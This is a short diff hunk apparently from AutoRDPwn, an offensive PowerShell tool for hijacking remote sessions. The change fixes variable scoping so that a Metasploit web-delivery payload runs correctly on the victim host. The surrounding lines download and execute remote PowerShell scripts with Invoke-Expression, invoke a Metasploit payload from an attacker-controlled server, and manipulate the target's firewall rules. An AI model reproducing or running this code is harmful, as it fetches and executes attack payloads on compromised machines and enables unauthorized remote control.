@@ -506,7 +506,7 @@ Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubu
 if ($metasploit){ invoke-command -session $RDP[0] -scriptblock { Write-Host
 Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-MetasploitPayload.ps1')
 Write-Host "==================== Metasploit Web Delivery =========================" -ForegroundColor Gray
-Invoke-MetasploitPayload -url http://$metaserver/$metarandom -verbose
+Invoke-MetasploitPayload -url http://$using:metaserver/$using:metarandom -verbose
 Write-Host "======================================================================" -ForegroundColor Gray ; Write-Host ; sleep -milliseconds 7500 }}
 
 if ($netcat -in 'local'){ invoke-command -session $RDP[0] -scriptblock { Write-Host ; netsh advfirewall firewall delete rule name="Powershell Remote Control Application" 2>&1> $null
